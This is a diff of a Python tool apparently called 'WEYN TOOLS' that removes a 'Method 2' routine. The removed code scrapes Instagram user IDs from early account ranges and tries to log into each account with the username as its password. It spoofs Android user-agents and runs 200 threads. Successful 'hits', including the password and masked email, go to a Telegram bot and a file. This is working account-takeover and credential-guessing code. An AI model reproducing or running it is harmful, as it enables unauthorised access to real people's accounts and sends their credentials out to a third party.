@@ -217,6 +217,8 @@ def show_menu():
     return input().strip()
 
 
+
+
 # ══════════════════════════════════════════════════════════
 #  METHOD 1  (m1.py)
 # ══════════════════════════════════════════════════════════
@@ -1184,147 +1186,6 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
             try: future.result()
             except Exception: pass
     _web_state['running'] = False
-
-# ══════════════════════════════════════════════════════════
-#  METHOD 2  — Login check (2010–2013 only)
-# ══════════════════════════════════════════════════════════
-
-M2_YEAR_RANGES = [
-    (1,           1_279_000,   2010),
-    (1_279_001,   17_750_000,  2011),
-    (17_750_001,  279_760_000, 2012),
-    (279_760_001, 900_990_000, 2013),
-]
-
-_M2_LOGIN_URL = 'https://i.instagram.com/api/v1/accounts/login/'
-
-_m2_hits         = 0
-_m2_bad          = 0
-_m2_retry        = 0
-_m2_total        = 0
-_m2_found_emails = []
-_m2_found_lock   = Lock()
-_m2_hit_lock     = Lock()
-
-def _m2_format_hit(hit_num, username, masked_email):
-    return (
-        f"\n╔═━━━────────────━━━═╗\n"
-        f"        WEYN IG HIT #{hit_num} [M2]\n"
-        f"╚═━━━────────────━━━═╝\n\n"
-        f"╭──〔🔛 W E Y N TOOLS🔛〕─────────────╮\n"
-        f"│\n"
-        f"│  𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞      ➤  @{username}\n"
-        f"│  𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝      ➤  {username}\n"
-        f"│  𝐌𝐚𝐬𝐤𝐞𝐝 𝐄𝐦𝐚𝐢𝐥  ➤  {masked_email or 'N/A'}\n"
-        f"│\n"
-        f"├──〔 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 〕──────────────────┤\n"
-        f"│\n"
-        f"│  https://www.instagram.com/{username}\n"
-        f"│\n"
-        f"╰──────────────────────────────────────╯\n"
-    )
-
-def _m2_check_login(username, token, chat_id):
-    global _m2_hits, _m2_bad, _m2_retry, _m2_total
-    uid_str = str(uuid.uuid4())
-    user_agent = (
-        'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416;'
-        ' huawei/google; Nexus 6P; angler; angler; en_US)'
-    )
-    data = {
-        'uuid': uid_str, 'password': username, 'username': username,
-        'device_id': uid_str, 'from_reg': 'false',
-        '_csrftoken': 'missing', 'login_attempt_count': '0',
-    }
-    try:
-        resp   = requests.post(_M2_LOGIN_URL, headers={'User-Agent': user_agent}, data=data, timeout=15)
-        result = resp.text
-        if '"ip"' in result or 'ip_block' in result:
-            with _m2_hit_lock:
-                _m2_retry += 1
-                _m2_total += 1
-            return
-        if '"logged_in_user"' in result or '"challenge_required"' in result:
-            masked = _m1_get_masked(username)
-            with _m2_hit_lock:
-                _m2_hits  += 1
-                _m2_total += 1
-            output = _m2_format_hit(_m2_hits, username, masked)
-            _send_telegram(token, chat_id, output)
-            _save_hit_to_file(output)
-            with _m2_found_lock:
-                if username not in _m2_found_emails:
-                    _m2_found_emails.append(username)
-        else:
-            with _m2_hit_lock:
-                _m2_bad   += 1
-                _m2_total += 1
-    except Exception:
-        with _m2_hit_lock:
-            _m2_retry += 1
-            _m2_total += 1
-
-def _m2_worker(token, chat_id, stop_event):
-    loc_session = _register_session(requests.Session())
-    while not (stop_event and stop_event.is_set()):
-        try:
-            bbk, bid, _ = random.choice(M2_YEAR_RANGES)
-            Id          = random.randint(bbk, bid)
-            rnd         = str(random.randint(10, 9999))
-            ua          = (
-                "Instagram 311.0.0.32.118 Android ("
-                + ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"][random.randint(0,5)]
-                + "; " + str(random.randint(100,1300)) + "dpi; "
-                + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000))
-                + "; " + ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"][random.randint(0,11)]
-                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"
-                + str(random.randint(111,999)) + ")"
-            )
-            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
-            headers = {
-                'accept': '*/*', 'accept-language': 'en,en-US;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dnt': '1', 'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/cristiano/following/',
-                'user-agent': ua,
-                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
-                'x-fb-lsd': lsd,
-            }
-            post_data = {
-                'lsd': lsd,
-                'fb_api_caller_class': 'RelayModern',
-                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
-                'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
-                'server_timestamps': 'true',
-                'doc_id': '7717269488336001',
-            }
-            resp = loc_session.post('https://www.instagram.com/api/graphql', headers=headers, data=post_data, timeout=10)
-            if resp.status_code == 200:
-                uname = resp.json().get('data', {}).get('user', {}).get('username')
-                if uname:
-                    _m2_check_login(uname, token, chat_id)
-        except Exception:
-            pass
-
-def run_method2_web(token, chat_id, stop_event):
-    global _m2_hits, _m2_bad, _m2_retry, _m2_total, _m2_found_emails
-    _m2_hits = _m2_bad = _m2_retry = _m2_total = 0
-    _m2_found_emails = []
-    _write_session_separator(2)
-    _web_state.update({
-        'running': True, 'method': '2',
-        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
-        'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
-        'recent_hits': [],
-    })
-    with ThreadPoolExecutor(max_workers=200) as executor:
-        futures = [executor.submit(_m2_worker, token, chat_id, stop_event) for _ in range(200)]
-        for future in as_completed(futures):
-            try: future.result()
-            except Exception: pass
-    _web_state['running'] = False
-
 
 def main():
     while True:
